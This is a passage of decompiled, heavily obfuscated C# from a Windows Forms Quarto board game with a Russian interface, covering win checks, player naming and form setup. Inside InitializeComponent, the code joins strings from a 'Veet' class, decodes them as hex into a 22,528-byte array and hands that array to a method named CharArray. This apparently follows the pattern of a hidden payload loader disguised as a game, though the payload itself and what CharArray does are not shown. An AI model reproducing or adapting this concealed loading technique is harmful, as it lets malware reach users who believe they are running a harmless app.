					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num56 = 1756497349;
						num57 = 1756497349;
					}
					else
					{
						num56 = 1018475268;
						num57 = 1018475268;
					}
					num2 = num56 ^ ((int)num3 * -547430527);
					continue;
				}
				case 66u:
					flag3 = num < 4;
					num2 = 350951479;
					continue;
				case 65u:
					if (mem[0, 3] != null)
					{
						num2 = 932352474;
						continue;
					}
					goto IL_0185;
				case 64u:
					flag = true;
					num2 = ((int)num3 * -1028428718) ^ 0x56EBFA23;
					continue;
				case 63u:
				{
					int num69;
					int num70;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num69 = 1842682130;
						num70 = 1842682130;
					}
					else
					{
						num69 = 407597670;
						num70 = 407597670;
					}
					num2 = num69 ^ ((int)num3 * -1950357566);
					continue;
				}
				case 62u:
					if (mem[1, 2] != null)
					{
						num2 = ((int)num3 * -1137436241) ^ -50064704;
						continue;
					}
					goto IL_0185;
				case 61u:
				{
					int num52;
					int num53;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num52 = 963807918;
						num53 = 963807918;
					}
					else
					{
						num52 = 1030308611;
						num53 = 1030308611;
					}
					num2 = num52 ^ ((int)num3 * -1831313975);
					continue;
				}
				case 60u:
					if (mem[3, 0] != null)
					{
						num2 = ((int)num3 * -1501324024) ^ -480835887;
						continue;
					}
					goto IL_0185;
				case 59u:
				{
					int num38;
					int num39;
					if (mem[num, 1].Dark == mem[num, 2].Dark)
					{
						num38 = -1737205280;
						num39 = -1737205280;
					}
					else
					{
						num38 = -1737761148;
						num39 = -1737761148;
					}
					num2 = num38 ^ ((int)num3 * -1194322888);
					continue;
				}
				case 58u:
				{
					int num20;
					int num21;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num20 = 1582242340;
						num21 = 1582242340;
					}
					else
					{
						num20 = 58246730;
						num21 = 58246730;
					}
					num2 = num20 ^ (int)(num3 * 83311719);
					continue;
				}
				case 57u:
				{
					int num7;
					int num8;
					if (mem[num, 1].Point != mem[num, 2].Point)
					{
						num7 = -103761908;
						num8 = -103761908;
					}
					else
					{
						num7 = -741412491;
						num8 = -741412491;
					}
					num2 = num7 ^ ((int)num3 * -966521809);
					continue;
				}
				case 56u:
				{
					int num62;
					int num63;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num62 = 337552935;
						num63 = 337552935;
					}
					else
					{
						num62 = 1835202024;
						num63 = 1835202024;
					}
					num2 = num62 ^ (int)(num3 * 1211025740);
					continue;
				}
				case 55u:
				{
					int num50;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num2 = 184183158;
						num50 = 184183158;
					}
					else
					{
						num2 = 543626596;
						num50 = 543626596;
					}
					continue;
				}
				case 54u:
					if (mem[num, 2].Big != mem[num, 3].Big)
					{
						num2 = ((int)num3 * -1975477025) ^ 0x447C7AF4;
						continue;
					}
					goto IL_03e0;
				case 53u:
					num2 = (int)(num3 * 1552494108) ^ -1548328474;
					continue;
				case 52u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num2 = (int)(num3 * 958322391) ^ -1175724756;
						continue;
					}
					goto IL_0432;
				case 51u:
				{
					int num27;
					int num28;
					if (mem[2, 2] != null)
					{
						num27 = -336129949;
						num28 = -336129949;
					}
					else
					{
						num27 = -1106134657;
						num28 = -1106134657;
					}
					num2 = num27 ^ (int)(num3 * 931870706);
					continue;
				}
				case 50u:
				{
					int num22;
					if (mem[num, 0].Dark != mem[num, 1].Dark)
					{
						num2 = 1662034964;
						num22 = 1662034964;
					}
					else
					{
						num2 = 113894558;
						num22 = 113894558;
					}
					continue;
				}
				case 49u:
					if (mem[3, num] != null)
					{
						num2 = (int)((num3 * 1616190444) ^ 0x61540AD8);
						continue;
					}
					goto IL_03d4;
				case 48u:
				{
					int num6;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num2 = 1055532568;
						num6 = 1055532568;
					}
					else
					{
						num2 = 248876118;
						num6 = 248876118;
					}
					continue;
				}
				case 47u:
				{
					int num65;
					int num66;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num65 = -590103053;
						num66 = -590103053;
					}
					else
					{
						num65 = -60287868;
						num66 = -60287868;
					}
					num2 = num65 ^ (int)(num3 * 927003465);
					continue;
				}
				case 46u:
					if (mem[num, 2].Dark != mem[num, 3].Dark)
					{
						num2 = ((int)num3 * -24374623) ^ -1509373596;
						continue;
					}
					goto IL_03e0;
				case 45u:
				{
					int num58;
					int num59;
					if (mem[num, 1].Big == mem[num, 2].Big)
					{
						num58 = -297530199;
						num59 = -297530199;
					}
					else
					{
						num58 = -1064604797;
						num59 = -1064604797;
					}
					num2 = num58 ^ ((int)num3 * -1785140336);
					continue;
				}
				case 44u:
					num11 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0186;
				case 43u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num2 = ((int)num3 * -1569035149) ^ -472942969;
						continue;
					}
					goto IL_0432;
				case 42u:
				{
					int num48;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num2 = 646615483;
						num48 = 646615483;
					}
					else
					{
						num2 = 823898411;
						num48 = 823898411;
					}
					continue;
				}
				case 41u:
				{
					int num46;
					int num47;
					if (mem[1, num].Point == mem[2, num].Point)
					{
						num46 = -1166404294;
						num47 = -1166404294;
					}
					else
					{
						num46 = -315888921;
						num47 = -315888921;
					}
					num2 = num46 ^ ((int)num3 * -27792167);
					continue;
				}
				case 40u:
				{
					int num42;
					int num43;
					if (mem[1, 1] != null)
					{
						num42 = -947834927;
						num43 = -947834927;
					}
					else
					{
						num42 = -802968039;
						num43 = -802968039;
					}
					num2 = num42 ^ ((int)num3 * -1093975468);
					continue;
				}
				case 39u:
				{
					int num36;
					int num37;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num36 = -1700847467;
						num37 = -1700847467;
					}
					else
					{
						num36 = -674591761;
						num37 = -674591761;
					}
					num2 = num36 ^ (int)(num3 * 1817788940);
					continue;
				}
				case 38u:
					if (mem[0, num] != null)
					{
						num2 = 778306341;
						continue;
					}
					goto IL_03d4;
				case 37u:
					num2 = 1496978671;
					continue;
				case 36u:
				{
					int num23;
					int num24;
					if (!flag3)
					{
						num23 = -204635769;
						num24 = -204635769;
					}
					else
					{
						num23 = -376687496;
						num24 = -376687496;
					}
					num2 = num23 ^ (int)(num3 * 1673745329);
					continue;
				}
				case 35u:
					if (mem[2, num].Square != mem[3, num].Square)
					{
						goto IL_03d4;
					}
					goto IL_03e0;
				case 34u:
				{
					int num18;
					if (mem[num, 0] != null)
					{
						num2 = 755180262;
						num18 = 755180262;
					}
					else
					{
						num2 = 111016119;
						num18 = 111016119;
					}
					continue;
				}
				case 33u:
				{
					int num12;
					int num13;
					if (mem[0, 0] == null)
					{
						num12 = 374673941;
						num13 = 374673941;
					}
					else
					{
						num12 = 2015431319;
						num13 = 2015431319;
					}
					num2 = num12 ^ (int)(num3 * 1007061055);
					continue;
				}
				case 32u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num2 = ((int)num3 * -957731641) ^ -2069342535;
						continue;
					}
					goto IL_07d8;
				case 31u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num2 = (int)(num3 * 1532397477) ^ -2019637837;
						continue;
					}
					goto IL_0432;
				case 30u:
					if (mem[2, num].Dark != mem[3, num].Dark)
					{
						num2 = (int)(num3 * 200635109) ^ -1159186922;
						continue;
					}
					goto IL_03e0;
				case 29u:
					if (mem[1, num].Square == mem[2, num].Square)
					{
						num2 = (int)((num3 * 95176995) ^ 0x6B8E13A1);
						continue;
					}
					goto IL_03d4;
				case 28u:
				{
					int num64;
					if (mem[num, 0].Square != mem[num, 1].Square)
					{
						num2 = 111016119;
						num64 = 111016119;
					}
					else
					{
						num2 = 1815909214;
						num64 = 1815909214;
					}
					continue;
				}
				case 27u:
				{
					int num60;
					int num61;
					if (mem[0, num].Big != mem[1, num].Big)
					{
						num60 = 201410280;
						num61 = 201410280;
					}
					else
					{
						num60 = 1535048382;
						num61 = 1535048382;
					}
					num2 = num60 ^ (int)(num3 * 216954093);
					continue;
				}
				case 26u:
				{
					int num54;
					int num55;
					if (mem[num, 2] != null)
					{
						num54 = -817462504;
						num55 = -817462504;
					}
					else
					{
						num54 = -308999113;
						num55 = -308999113;
					}
					num2 = num54 ^ ((int)num3 * -731079668);
					continue;
				}
				case 25u:
				{
					int num51;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num2 = 517641609;
						num51 = 517641609;
					}
					else
					{
						num2 = 1131962261;
						num51 = 1131962261;
					}
					continue;
				}
				case 24u:
					if (mem[2, num] != null)
					{
						num2 = (int)(num3 * 983491687) ^ -2112852569;
						continue;
					}
					goto IL_03d4;
				case 23u:
				{
					int num49;
					if (mem[0, num].Dark != mem[1, num].Dark)
					{
						num2 = 1298876353;
						num49 = 1298876353;
					}
					else
					{
						num2 = 1506694567;
						num49 = 1506694567;
					}
					continue;
				}
				case 22u:
					if (mem[0, num].Square == mem[1, num].Square)
					{
						num2 = 1380975832;
						continue;
					}
					goto IL_03d4;
				case 21u:
					if (mem[num, 2].Square != mem[num, 3].Square)
					{
						num2 = (int)(num3 * 846600243) ^ -1015586676;
						continue;
					}
					goto IL_03e0;
				case 20u:
					if (mem[num, 2].Point != mem[num, 3].Point)
					{
						num2 = ((int)num3 * -13689159) ^ 0x4B739E69;
						continue;
					}
					goto IL_03e0;
				case 19u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num2 = (int)(num3 * 20653906) ^ -907638586;
						continue;
					}
					goto IL_0a6e;
				case 18u:
				{
					int num44;
					int num45;
					if (mem[num, 0].Big != mem[num, 1].Big)
					{
						num44 = -1841956912;
						num45 = -1841956912;
					}
					else
					{
						num44 = -2072659320;
						num45 = -2072659320;
					}
					num2 = num44 ^ ((int)num3 * -1871232113);
					continue;
				}
				case 17u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num2 = 1130168396;
						continue;
					}
					goto IL_07d8;
				case 16u:
					if (mem[2, 1] != null)
					{
						num2 = (int)(num3 * 968035440) ^ -1572467064;
						continue;
					}
					goto IL_0185;
				case 15u:
				{
					int num40;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num2 = 1863947207;
						num40 = 1863947207;
					}
					else
					{
						num2 = 1544959908;
						num40 = 1544959908;
					}
					continue;
				}
				case 14u:
					flag = true;
					num2 = ((int)num3 * -105084228) ^ -1185849669;
					continue;
				case 13u:
				{
					int num35;
					if (mem[num, 0].Point != mem[num, 1].Point)
					{
						num2 = 1840277931;
						num35 = 1840277931;
					}
					else
					{
						num2 = 1337071625;
						num35 = 1337071625;
					}
					continue;
				}
				case 12u:
				{
					int num33;
					int num34;
					if (mem[num, 1] != null)
					{
						num33 = 459780776;
						num34 = 459780776;
					}
					else
					{
						num33 = 2048506495;
						num34 = 2048506495;
					}
					num2 = num33 ^ (int)(num3 * 1578657804);
					continue;
				}
				case 11u:
				{
					int num25;
					int num26;
					if (mem[num, 1].Square != mem[num, 2].Square)
					{
						num25 = -292414685;
						num26 = -292414685;
					}
					else
					{
						num25 = -684740531;
						num26 = -684740531;
					}
					num2 = num25 ^ (int)(num3 * 1875462998);
					continue;
				}
				case 10u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num2 = ((int)num3 * -798250501) ^ -475641341;
						continue;
					}
					goto IL_0a6e;
				case 9u:
					num++;
					num2 = ((int)num3 * -2010331799) ^ 0x361881E5;
					continue;
				case 8u:
					if (mem[2, num].Point != mem[3, num].Point)
					{
						num2 = (int)((num3 * 1311756449) ^ 0x37737C3D);
						continue;
					}
					goto IL_03e0;
				case 7u:
					if (mem[2, num].Big != mem[3, num].Big)
					{
						num2 = ((int)num3 * -1022779651) ^ 0x679641F8;
						continue;
					}
					goto IL_03e0;
				case 6u:
					result = flag;
					num2 = 817152876;
					continue;
				case 5u:
				{
					int num16;
					int num17;
					if (mem[1, num].Big != mem[2, num].Big)
					{
						num16 = -1940823586;
						num17 = -1940823586;
					}
					else
					{
						num16 = -756945514;
						num17 = -756945514;
					}
					num2 = num16 ^ ((int)num3 * -278618131);
					continue;
				}
				case 4u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num2 = (int)(num3 * 1614918978) ^ -1042705262;
						continue;
					}
					goto IL_0a6e;
				case 3u:
					if (mem[1, num] != null)
					{
						num2 = (int)((num3 * 61919485) ^ 0x7C104193);
						continue;
					}
					goto IL_03d4;
				case 2u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = 1015262533;
						num10 = 1015262533;
					}
					else
					{
						num9 = 921905221;
						num10 = 921905221;
					}
					num2 = num9 ^ ((int)num3 * -1783955475);
					continue;
				}
				case 1u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num2 = ((int)num3 * -1393815404) ^ 0x6CE9372E;
						continue;
					}
					goto IL_0a6e;
				case 0u:
				{
					int num4;
					int num5;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num4 = 1836383132;
						num5 = 1836383132;
					}
					else
					{
						num4 = 1958335657;
						num5 = 1958335657;
					}
					num2 = num4 ^ ((int)num3 * -1507395957);
					continue;
				}
				case 73u:
					break;
				default:
					{
						return result;
					}
					IL_07d8:
					num11 = 0;
					goto IL_0186;
					IL_03d4:
					num2 = 1689253175;
					num19 = 1689253175;
					continue;
					IL_0432:
					num11 = 1;
					goto IL_0186;
					IL_0a6e:
					num11 = 1;
					goto IL_0186;
					IL_03e0:
					num2 = 1436597370;
					num19 = 1436597370;
					continue;
					IL_0185:
					num11 = 0;
					goto IL_0186;
					IL_0186:
					flag2 = (byte)num11 != 0;
					num2 = 360005218;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		bool result = default(bool);
		while (true)
		{
			int num = -24802496;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE551980Du) % 15u)
				{
				case 14u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = 1350193699;
						num9 = 1350193699;
					}
					else
					{
						num8 = 947413337;
						num9 = 947413337;
					}
					num = num8 ^ (int)(num2 * 57164402);
					continue;
				}
				case 13u:
				{
					int num6;
					int num7;
					if (!flag3)
					{
						num6 = 898611134;
						num7 = 898611134;
					}
					else
					{
						num6 = 1754614039;
						num7 = 1754614039;
					}
					num = num6 ^ (int)(num2 * 1474350921);
					continue;
				}
				case 11u:
					num3++;
					num = -1007144367;
					continue;
				case 10u:
					num4++;
					num = (int)((num2 * 1394202030) ^ 0x58B32696);
					continue;
				case 9u:
					flag3 = num4 < 4;
					num = -1480805100;
					continue;
				case 8u:
					flag = false;
					num = ((int)num2 * -208425655) ^ -279223209;
					continue;
				case 7u:
					num = ((int)num2 * -1358606322) ^ -40867044;
					continue;
				case 6u:
					result = flag;
					num = ((int)num2 * -1735943917) ^ -954980601;
					continue;
				case 5u:
					num4 = 0;
					num = (int)((num2 * 1653668988) ^ 0x52CFD5C9);
					continue;
				case 4u:
				{
					int num5;
					if (num3 >= 4)
					{
						num = -1711039546;
						num5 = -1711039546;
					}
					else
					{
						num = -1804027800;
						num5 = -1804027800;
					}
					continue;
				}
				case 2u:
					flag2 = mem[num4, num3] == null;
					num = -1406265552;
					continue;
				case 1u:
					num3 = 0;
					num = -1007144367;
					continue;
				case 0u:
					num = ((int)num2 * -896785015) ^ 0x6B4F93BC;
					continue;
				case 12u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -344500;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB4C8ED61u) % 4u)
				{
				case 3u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1151138072) ^ -1723009989;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1536184808) ^ -718686546;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -96452881;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xA29AB4F2u) % 8u)
				{
				case 7u:
					num = ((int)num2 * -266686477) ^ 0x63AE5581;
					continue;
				case 6u:
					Form1.smethod_51((IDisposable)components);
					num = (int)(num2 * 620165567) ^ -784042396;
					continue;
				case 5u:
					if (disposing)
					{
						num = (int)((num2 * 487305934) ^ 0xA32CB1E);
						continue;
					}
					num5 = 0;
					goto IL_0042;
				case 4u:
					num = ((int)num2 * -707988484) ^ 0x23D7FE93;
					continue;
				case 2u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_0042;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 692967909;
						num4 = 692967909;
					}
					else
					{
						num3 = 108735267;
						num4 = 108735267;
					}
					num = num3 ^ (int)(num2 * 1019244750);
					continue;
				}
				case 3u:
					break;
				default:
					{
						((Form)this).Dispose(disposing);
						return;
					}
					IL_0042:
					flag = (byte)num5 != 0;
					num = -1417644702;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0596: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a0: Expected O, but got Unknown
		bool flag = default(bool);
		int num3 = default(int);
		string string_ = default(string);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = -424249973;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xEA21CE02u) % 129u)
				{
				case 128u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -776732379) ^ -1812578346;
					continue;
				case 127u:
					num = (int)(num2 * 1561026069) ^ -335448243;
					continue;
				case 126u:
					Form1.smethod_64((Control)(object)label5, 12);
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -1813840335) ^ -1719560919;
					continue;
				case 125u:
					flag = num3 < 22528;
					num = -1374157515;
					continue;
				case 124u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)((num2 * 1665188797) ^ 0x57B071B9);
					continue;
				case 123u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 1365533699) ^ 0x566EFB38);
					continue;
				case 122u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -487581029) ^ -317388313;
					continue;
				case 121u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)((num2 * 1361302202) ^ 0x759C4EB9);
					continue;
				case 120u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)(num2 * 210906680) ^ -1595778527;
					continue;
				case 119u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1551913739) ^ 0x607466E;
					continue;
				case 118u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					num = (int)(num2 * 1913836715) ^ -169246649;
					continue;
				}
				case 117u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 429836061) ^ -836193915;
					continue;
				case 115u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -226613408) ^ -494703338;
					continue;
				case 114u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -31932794) ^ -1095860533;
					continue;
				case 113u:
					num3++;
					num = ((int)num2 * -1084271508) ^ -58155532;
					continue;
				case 112u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)(num2 * 2086739501) ^ -511614000;
					continue;
				case 111u:
					Form1.smethod_85((Control)(object)this, "Form1");
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1979109701) ^ -408784338;
					continue;
				case 110u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -904713556) ^ 0x3A637A6F;
					continue;
				case 109u:
					num = (int)((num2 * 468815776) ^ 0x5B4F385C);
					continue;
				case 108u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -626112490) ^ 0x16002994;
					continue;
				case 107u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -681166391;
						num5 = -681166391;
					}
					else
					{
						num4 = -965715539;
						num5 = -965715539;
					}
					num = num4 ^ ((int)num2 * -1285850500);
					continue;
				}
				case 106u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -211730292) ^ 0x13AA06E8;
					continue;
				case 105u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 1782357003) ^ -428993753;
					continue;
				case 104u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -503205193) ^ 0x111FEC68;
					continue;
				case 103u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = (int)((num2 * 2001662719) ^ 0x69F33A27);
					continue;
				case 102u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -1629590600) ^ -1803601848;
					continue;
				case 101u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1005740024) ^ 0x4255A46D;
					continue;
				case 100u:
					num = ((int)num2 * -1024013615) ^ 0x1847BCB1;
					continue;
				case 99u:
					num = ((int)num2 * -337214108) ^ 0xE3DD39A;
					continue;
				case 98u:
					Form1.smethod_61((Control)(object)button1, "button1");
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1951097350) ^ 0x5EA427D2;
					continue;
				case 97u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -221118706) ^ -2033775973;
					continue;
				case 96u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)(num2 * 29051750) ^ -1619977113;
					continue;
				case 95u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = (int)((num2 * 1869099717) ^ 0x714319E0);
					continue;
				case 94u:
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -191774323) ^ -1574451811;
					continue;
				case 93u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -46966209) ^ 0x494FA1B8;
					continue;
				case 92u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 1325341037) ^ 0x1040840B);
					continue;
				case 91u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 2126715571) ^ 0x2A77DFEB);
					continue;
				case 90u:
					num = ((int)num2 * -157945710) ^ -1669948155;
					continue;
				case 89u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 905314314) ^ 0x2BA9295F);
					continue;
				case 88u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -1481557970) ^ -49160069;
					continue;
				case 87u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)((num2 * 313487424) ^ 0x3437A41A);
					continue;
				case 86u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)((num2 * 873890547) ^ 0x7CFC4C96);
					continue;
				case 85u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1261707497) ^ 0x21B65FCF;
					continue;
				case 84u:
					num = ((int)num2 * -1649738935) ^ 0xDE21FFE;
					continue;
				case 83u:
					num = -801931955;
					continue;
				case 82u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -250148966) ^ -1849234960;
					continue;
				case 81u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)((num2 * 1534794430) ^ 0x35958E28);
					continue;
				case 80u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)((num2 * 902785050) ^ 0x7F1DFA6);
					continue;
				case 79u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1271701219) ^ 0x24F46360;
					continue;
				case 78u:
					string_ = Veet.Sa;
					num = (int)(num2 * 1106174459) ^ -1634115483;
					continue;
				case 77u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -754760683) ^ -462328808;
					continue;
				case 76u:
					num3 = 0;
					num = ((int)num2 * -836952984) ^ 0x34668C1;
					continue;
				case 75u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1419444805) ^ -397497394;
					continue;
				case 74u:
					num = (int)(num2 * 235521044) ^ -850166137;
					continue;
				case 73u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)(num2 * 134278471) ^ -1481954362;
					continue;
				case 72u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -950834282) ^ -464739966;
					continue;
				case 71u:
					Form1.smethod_72(timer1, 1000);
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)((num2 * 1019342725) ^ 0x487F1006);
					continue;
				case 70u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -2081620317) ^ 0x7D4E70A6;
					continue;
				case 69u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)(num2 * 1571223207) ^ -996364722;
					continue;
				case 67u:
					label5 = Form1.smethod_57();
					num = (int)(num2 * 1884298600) ^ -726089569;
					continue;
				case 66u:
					num = (int)((num2 * 572700414) ^ 0x274B0A69);
					continue;
				case 65u:
					num = ((int)num2 * -184731538) ^ -845426566;
					continue;
				case 64u:
					num = (int)((num2 * 829269358) ^ 0x652FFE06);
					continue;
				case 63u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 1167800785) ^ -133584926;
					continue;
				case 62u:
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -671997104) ^ -860525150;
					continue;
				case 61u:
					num = ((int)num2 * -133443503) ^ -1141487614;
					continue;
				case 60u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -838981822) ^ 0x412739D8;
					continue;
				case 59u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)((num2 * 338580059) ^ 0x4CE5B8C9);
					continue;
				case 58u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)(num2 * 1985935531) ^ -1432641706;
					continue;
				case 57u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -720005771) ^ 0x3B65A7FE;
					continue;
				case 56u:
					CharArray(array, string.Empty);
					num = (int)((num2 * 2118298535) ^ 0x2E1BE399);
					continue;
				case 55u:
					num = (int)((num2 * 1817103423) ^ 0x262BF835);
					continue;
				case 54u:
					array = new byte[22528];
					num = ((int)num2 * -108169092) ^ 0x61025F5;
					continue;
				case 53u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -283117202) ^ -1323811889;
					continue;
				case 52u:
					num = ((int)num2 * -1126151260) ^ 0x2B386087;
					continue;
				case 51u:
					num = (int)(num2 * 697251843) ^ -398835142;
					continue;
				case 50u:
					num = ((int)num2 * -1925317833) ^ 0x44EB3DAD;
					continue;
				case 49u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					Form1.smethod_92((Control)(object)this);
					num = (int)((num2 * 316373322) ^ 0xA44DB6B);
					continue;
				case 48u:
					num = ((int)num2 * -1136047138) ^ 0x4D5FFE40;
					continue;
				case 47u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 264884968) ^ -780571695;
					continue;
				case 46u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -853703502) ^ -1421661255;
					continue;
				case 45u:
					num = (int)((num2 * 294648703) ^ 0x520B7E59);
					continue;
				case 44u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 348700963) ^ 0x2CD51990);
					continue;
				case 43u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 222122019) ^ 0x5BBD3DC1);
					continue;
				case 42u:
					Form1.smethod_64((Control)(object)label6, 13);
